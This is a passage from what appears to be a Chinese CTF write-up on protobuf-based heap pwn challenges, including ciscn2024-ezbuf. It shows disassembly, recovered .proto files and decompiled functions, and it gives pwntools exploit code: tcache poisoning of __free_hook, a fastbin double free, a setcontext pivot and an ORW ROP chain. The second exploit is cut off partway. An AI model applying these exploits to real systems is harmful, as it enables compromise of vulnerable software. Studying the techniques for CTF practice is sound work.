class="line">.data.rel.ro:0000000000009C80 C0 70 00 00 00 00 00 00 5D 18+dq offset unk_70E4                      ; package_name</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dq 40h                                  ; sizeof_message</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00+dd 4                                    ; n_fields</span><br><span class="line">.data.rel.ro:0000000000009C80 00 00 00 00 00 00 00 00 00 00 db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset stru_9B60                     ; fields</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70B0                      ; fields_sorted_by_name</span><br><span class="line">.data.rel.ro:0000000000009C80                               dd 1                                    ; n_field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               db 4 dup(0)</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset unk_70C0                      ; field_ranges</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq offset sub_185D                      ; message_init</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved1</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved2</span><br><span class="line">.data.rel.ro:0000000000009C80                               dq 0                                    ; reserved3</span><br></pre></td></tr></table></figure><p>最终可以得出，前面三个成员的数据类型为<code>sint64</code>，最后一个成员的数据类型为<code>bytes</code>，所以可以自己写出<code>proto</code>文件了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message Devicemsg&#123;</span><br><span class="line">required sint64 actionid = <span class="number">1</span>;</span><br><span class="line">required sint64 msgidx = <span class="number">2</span>;</span><br><span class="line">required sint64 msgsize = <span class="number">3</span>;</span><br><span class="line">required bytes msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后只需要使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --python_out=. ./msg.proto</span><br></pre></td></tr></table></figure><p>就可以生成python专用的脚本文件</p><p>之后只需要在exp中import就可以进行序列化交互了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Devicemsg_pb2</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size, content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = Devicemsg_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You can try to have friendly communication with me now: &#x27;</span>)</span><br><span class="line">    r.send(msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    create(i, <span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">7</span>-i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recv(<span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base =&gt; &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x590</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base =&gt; &quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">__free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret_addr = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x151990</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, flat(__free_hook, <span class="number">0</span>))</span><br><span class="line">create(<span class="number">8</span>, <span class="number">0xf0</span>)</span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xf0</span>, flat(magic_gadget))</span><br><span class="line"></span><br><span class="line">flag_addr = heap_base + <span class="number">0x440</span></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop_chain += flat(pop_rdi, flag_addr, pop_rsi, <span class="number">2</span>, open_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, <span class="number">3</span>, pop_rsi, libc_base +</span><br><span class="line">                  libc.bss() + <span class="number">0x500</span>, pop_rdx, <span class="number">0x50</span>, read_addr)</span><br><span class="line">rop_chain += flat(pop_rdi, libc_base + libc.bss() + <span class="number">0x500</span>, puts_addr)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;./flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>, flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + rop_chain</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + flat(flag_addr + <span class="number">0x28</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>, payload)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>版本相关</strong></p><p>最后需要注意的是,有时候会因为<u>版本的差异</u></p><p>导致序列化的细节不相同</p><p>所以这时候就需要对应的版本</p><p>可以参考<a href="https://ywhkkx.github.io/2022/11/03/祥云杯CTF2022/"> Pwn进你的心 (ywhkkx.github.io)</a></p><h2 id="ciscn2024-ezbuf"><a href="#ciscn2024-ezbuf" class="headerlink" title="ciscn2024-ezbuf"></a>ciscn2024-ezbuf</h2><p>时隔一年,2024的ciscn又出现了两道protobuf的题目,这是第一天放出的最后一题</p><p>按照之前的方法写出proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Devicemsg</span> &#123;</span><br><span class="line">  <span class="type">bytes</span> whatcon = <span class="number">1</span>;</span><br><span class="line">  <span class="type">sint64</span> whattodo = <span class="number">2</span>;</span><br><span class="line">  <span class="type">sint64</span> whatidx = <span class="number">3</span>;</span><br><span class="line">  <span class="type">sint64</span> whatsize = <span class="number">4</span>;</span><br><span class="line">  <span class="type">uint32</span> whatthis = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后生成python接口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc --python_out=. ./ezbuf.proto</span><br></pre></td></tr></table></figure><p>这里在生成的时候遇到了一些问题,即提示版本不适配,</p><p>这个时候去<a href="https://github.com/protocolbuffers/protobuf">protobuf: Protocol Buffers </a>下载要求的protoc版本,并使用其编译</p><p>然后再指定python的protobuf包版本与之匹配即可开始使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install protobuf=version</span><br></pre></td></tr></table></figure><p>然后写出交互函数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = content</span><br><span class="line">msg.whattodo = <span class="number">1</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">2</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">1</span></span><br><span class="line">msg.whatthis = <span class="number">2</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">msg = c_pb2.Devicemsg()</span><br><span class="line">msg.whatcon = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">msg.whattodo = <span class="number">3</span></span><br><span class="line">msg.whatidx = idx</span><br><span class="line">msg.whatsize = <span class="number">0</span></span><br><span class="line">msg.whatthis = <span class="number">0</span></span><br><span class="line">sa(<span class="string">b&#x27;WHAT DO YOU WANT?\n&#x27;</span>,msg.SerializeToString())</span><br></pre></td></tr></table></figure><p>这道题目有点意思,比赛的时候一直被show函数中的两个分支给迷惑了,一直在想这两个分支有什么用,最后结论是没软用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx, <span class="type">int</span> this, __int64 size, __int64 a4, <span class="type">char</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> delim; <span class="comment">// [rsp+33h] [rbp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">15</span>]; <span class="comment">// [rsp+41h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v11[<span class="number">7</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = idx;</span><br><span class="line">  delim = this;</span><br><span class="line">  <span class="built_in">strcpy</span>(v11, <span class="string">&quot;hahaha&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">8</span> &amp;&amp; ptr_qword_C0A0[v9] )</span><br><span class="line">    v10 = (<span class="type">char</span> *)ptr_qword_C0A0[v9];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v10 = v11;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( this == <span class="string">&#x27;\xFF&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    seccomp_load(qword_C328);</span><br><span class="line">    strtok(content, &amp;delim);</span><br><span class="line">    v10 = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="string">&#x27;0&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(buf, &amp;delim);</span><br><span class="line">    v10 = strtok(<span class="number">0LL</span>, &amp;delim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, v10);</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( ++dword_C084 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    close(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)&amp;v11[<span class="number">7</span>] - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>add函数,能够申请9个note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">add</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2, <span class="type">const</span> <span class="type">void</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">8</span> )</span><br><span class="line">    v5 = <span class="number">8</span>;</span><br><span class="line">  *((_QWORD *)&amp;ptr_qword_C0A0 + v5) = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(*((<span class="type">void</span> **)&amp;ptr_qword_C0A0 + v5), a3, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数存在指针悬空</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">delete</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)fnum_dword_C080 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No chance!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">8</span> || !*((_QWORD *)&amp;ptr_qword_C0A0 + a1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OOPS!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;ptr_qword_C0A0 + a1));</span><br><span class="line">  <span class="keyword">return</span> ++fnum_dword_C080;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到初始化函数中,有初始化一套沙盒规则,但是只有在show中的一个分支会加载</p><p>完全可以避免,并且在初始化沙盒的过程中,堆布局被打乱了,不过这有一个好处就是初始的时候unsorted中就已经是有chunk的</p><p>然后protobuf过程会申请chunk,特别是content的内容位于一个独立的chunk,控制其大小就可以控制申请任意大小chunk</p><p>这样在add的时候memcpy就会将chunk上的残留的libc一起复制过来,然后只要填充8个字节就能泄露libc,至于泄露heap就更简单了</p><p>接着我们考虑如何做到任意写,show函数在调用完两次之后就不建议使用了,因为第三次使用就会加载沙盒,而我们也没有必须再一次泄露的必要</p><p>delete允许我们最多使用10次,首先想到的就是构造doublefree</p><p>这里有两种思路</p><ol><li>填满tcache,释放victim到fastbin,在取出一个.再释放victim进入tcache,不过这种方式在是行不通的,因为之后取出的时候必然会先取出tcache中的,那么之后取出fastbin中的时候除非找到刚好的fakechunk,否则就会触发错误</li><li>第二种方式,即完全利用fastbin进行double free,填满tcache后释放一次victim,释放一个正常chunk防止fast的doublefree检查,然后再释放victim</li></ol><p>采用第二种方法后就成功在fastbin中构造doublefree了,现在又面临一个问题,劫持fastbin时依然会受到fastbin的size检查影响</p><p>但其实完全不用担心这个问题,因为再引入tcache之后,就增加了一个机制,即从fastbin或smallbin中取出chunk时,如果对应tcache中有空余就将链中的chunk移动到tcache中</p><p>所以在我们第一次取出victim的时候,剩下的fastbin中chunk就已经移动到tcache中了,那也就没有那些检查了</p><p>ok,接下来考虑如何利用,我们的劫持的tcache链大小只有0x40,能写的只有0x30,下一步应该如何走</p><p>如果只有一次劫持机会,想要在这一次就完成利用几乎是不可能的,所以我们希望能够多几次劫持</p><p>最直接的一个思路就是劫持tcache结构体,但因为0x30太小了,不能在覆盖count的同时覆盖entry</p><p>所以选择二次劫持tcache结构体</p><p>注意到此时tcache如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  3]: 0x55f93cabb100 —▸ 0x55f93cabae40 —▸ 0x55f93cab60f0 ◂— 0x55f93cab6</span><br><span class="line">0xd0 [  7]: 0x55f93cab77d0 —▸ 0x55f93cab74a0 —▸ 0x55f93cab7170 —▸ 0x55f93cab6e40 —▸ 0x55f93cab6b10 —▸ 0x55f93cab67e0 —▸ 0x55f93cab6350 ◂— 0x0</span><br><span class="line">0xf0 [  1]: 0x55f93cab9260 ◂— 0x0</span><br></pre></td></tr></table></figure><p>我们先劫持0xf0的chunk,使其指向tcache结构体的开头,再靠protobuf的任意chunk申请进行写操作</p><p>然后这时候就能够比较自由的任意写了,现在的话主要是两种主流的方法泄露stack劫持rop<u>或者</u>fsop</p><p>如果选择fsop就不需要再进行泄露了,不过因为这题无法main函数返回或者exit退出,所以只能通过printf进行fsop,一些模板的偏移可能需要进行一些调整</p><p>rop的话则还需要一次泄露栈地址,但不能使用show函数,那还能怎样泄露?自然是<code>_IO_2_1_stdout_</code>结构体</p><p>这一部分没啥好说的,注意调试就是了</p><p>采用<u>rop</u>方法的exp如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> c_pb2</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span 